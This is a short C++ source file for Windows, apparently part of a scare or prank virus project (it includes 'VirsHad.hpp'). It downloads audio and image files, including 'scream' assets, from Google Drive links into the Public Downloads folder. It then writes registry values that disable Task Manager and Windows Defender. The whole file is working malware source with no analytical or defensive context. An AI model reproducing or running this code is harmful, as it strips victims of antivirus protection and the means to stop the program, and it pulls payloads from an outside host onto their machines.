#include <Windows.h>
#include "VirsHad.hpp"

void Download() {
	GetFileURL(L"https://drive.google.com/uc?export=download&id=1hEGfM2a3CI__Zb1E9ra9o-Rk4UB_VG4J",
		L"C:\\Users\\Public\\Downloads\\BG.wav");
	GetFileURL(L"https://drive.google.com/uc?export=download&id=1QSB8qiO7UNal3DRVcNksGqt7blJvfO7d",
		L"C:\\Users\\Public\\Downloads\\WP.bmp");
	GetFileURL(L"https://drive.google.com/uc?export=download&id=10uFLkcXovBrfUsKFv5aibp--y82cPGMi",
		L"C:\\Users\\Public\\Downloads\\scream.wav");
	GetFileURL(L"https://drive.google.com/uc?export=download&id=1NHPXcHardB10CLDIykeX3T758WyJc5zi",
		L"C:\\Users\\Public\\Downloads\\screamBG.bmp");
}

void Disable() {
	SRV(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", L"1");
	SRV(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", L"DisableAntiSpyware", L"1");
}
